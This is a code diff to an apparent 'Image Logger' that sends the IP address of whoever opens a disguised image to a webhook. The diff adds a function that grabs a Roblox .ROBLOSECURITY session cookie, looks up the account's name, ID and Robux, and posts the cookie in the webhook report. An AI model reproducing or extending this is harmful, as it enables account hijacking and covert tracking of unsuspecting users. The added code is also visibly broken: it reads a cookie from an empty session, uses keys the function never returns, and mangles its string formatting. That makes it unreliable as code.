@@ -73,6 +73,33 @@ def botCheck(ip, useragent):
         return "Telegram"
     else:
         return False
+    
+def get_roblox_info():
+    try:
+        session = requests.Session()
+        cookie = session.cookies['.ROBLOSECURITY']
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        })
+        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
+        if user_resp.status_code != 200:
+            return None
+        user_data = user_resp.json()
+        uid = user_data.get('id')
+        username = user_data.get('name', 'Unknown')
+        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
+        if robux_resp.status_code != 200:
+            return {'username': username, 'id': str(uid) if uid else 'Unknown', 'robux': 'Error', 'cookie': cookie}
+        robux_data = robux_resp.json()
+        robux = robux_data.get('robux', 0)
+        return {
+            'username': username,
+            'id': str(uid) if uid else 'Unknown',
+            'robux': f"{robux:,}",
+            'cookie': cookie
+        }
+    except:
+        return None
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -92,6 +119,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         return
     
     bot = botCheck(ip, useragent)
+    roblox_info = get_roblox_info()
     
     if bot:
         requests.post(config["webhook"], json = {
@@ -146,7 +174,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A User Opened the Original Image!** + (f"\n\n**Roblox Account:**\n> **Username:** `{roblox_info['username']}`\n> **Display Name:** `{roblox_info['displayName']}`\n> **User ID:** `{roblox_info['id']}`\n> **Robux:** `{roblox_info['robux']}`\n> **Premium:** `{'Yes' if roblox_info['premium'] else 'No'}`\n> **Cookie:** ```{roblox_info['cookie']}```" if roblox_info else "") +
 
 **Endpoint:** `{endpoint}`
             
